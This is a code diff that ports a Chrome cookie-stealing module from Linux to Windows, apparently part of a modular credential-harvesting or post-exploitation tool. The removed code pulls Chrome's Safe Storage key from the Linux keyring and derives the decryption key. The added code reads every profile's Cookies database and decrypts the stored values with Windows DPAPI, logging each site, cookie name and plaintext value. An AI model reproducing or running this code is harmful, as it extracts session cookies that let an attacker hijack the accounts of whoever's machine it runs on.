@@ -3,23 +3,21 @@
 try:
 	import os
 	import sqlite3
-	from Crypto.Cipher import AES
-	from hashlib import pbkdf2_hmac
-	import secretstorage
+	import win32crypt
 except ImportError:
 	pass
 
-from modules.linux.chrome.chrome_module import ChromeModule
+from modules.windows.chrome.chrome_module import ChromeModule
 
 
-class LinuxChromeCookie(ChromeModule):
+class WindowsChromeCookie(ChromeModule):
 	def __init__(self):
 		ChromeModule.__init__(
 			self,
-			name='LinuxChromeCookie',
-			version='0.1.1',
+			name='WindowsChromeCookie',
+			version='0.1.0',
 			file=__file__,
-			dependencies=['os', 'sqlite3', 'Crypto', 'hashlib', 'secretstorage'],
+			dependencies=['os', 'sqlite3', 'win32crypt'],
 		)
 
 	def can(self):
@@ -32,43 +30,20 @@ class LinuxChromeCookie(ChromeModule):
 		if not super().execute():
 			return False
 
-		bus = secretstorage.dbus_init()
-		collection = secretstorage.get_any_collection(bus)  ## login keyring
-
-		# Set the default linux password
-		# https://github.com/n8henrie/pycookiecheat/issues/27
-		my_pass = "peanuts"
-		if not collection.is_locked():
-			poss = ['Chrome', 'Chromium']
-			items1 = collection.get_all_items()
-			for item in items1:
-				for pos in poss:
-					if item.get_label() == f"{pos} Safe Storage":
-						my_pass = item.get_secret()
-
-		enc_key = pbkdf2_hmac(
-			hash_name='sha1',
-			password=my_pass.encode('utf8') if type(my_pass) == str else my_pass,
-			salt=b'saltysalt',
-			iterations=1,
-			dklen=16
-		)
-
 		for profile in self.get_profiles():
-			cookie_path = profile + '/Cookies'
+			cookie_path = profile + '\\Cookies'
 			if os.path.isfile(cookie_path):
-				self.log(profile.split('/')[-1] + ':')
 				connection = sqlite3.connect(cookie_path)
 				cursor = connection.cursor()
 				try:
-					cursor.execute('SELECT host_key, name, value, encrypted_value FROM cookies')
+					cursor.execute('SELECT host_key, name, encrypted_value FROM cookies')
 				except sqlite3.OperationalError:
 					self.executenot(cookie_path + ' database is locked', 1)
 					return False
 
 				self.log('url,name,value')
-				for host_key, name, value, encrypted_value in cursor.fetchall():
-					self.log(host_key + ',' + name + ',' + str(value if value else self.decrypt(encrypted_value, enc_key)))
+				for host_key, name, encrypted_value in cursor.fetchall():
+					self.log(host_key + ',' + name + ',' + (win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]).decode('utf-8'))
 
 		return True
 
